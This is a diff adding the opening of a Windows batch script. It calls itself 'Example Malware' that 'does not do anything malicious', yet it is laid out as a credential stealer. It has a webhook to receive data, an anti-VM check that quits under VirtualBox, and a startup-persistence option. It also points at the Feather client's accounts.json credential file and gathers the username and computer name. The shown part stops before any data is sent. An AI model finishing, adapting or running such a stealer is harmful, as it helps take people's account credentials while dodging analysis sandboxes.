@@ -1,0 +1,28 @@
+rem Example Malware -- Does not do anything malicious
+
+@echo off
+setlocal
+
+set webhook= INSERT YOUR WEBHOOK HERE
+set tempDir=%temp%\my_script_temp
+set antiVM=true
+set startOnStartup=false
+set accountFile=C:\Users\%username%\AppData\Roaming\.feather\accounts.json
+
+:start
+rem Create a temporary directory
+mkdir "%tempDir%" 2>nul
+
+rem Check Anti-VM
+if "%antiVM%"=="true" (
+    wmic path win32_videocontroller get name | findstr /i "virtualbox" >nul
+    if not errorlevel 1 (
+        echo Anti-VM check failed. Exiting...
+        timeout 2 >NUL
+        exit /b
+    )
+)
+
+rem Get PC username and name
+for /F "usebackq tokens=2 delims=\ " %%U in (`whoami`) do set "username=%%U"
+set "pcname=%computername%"
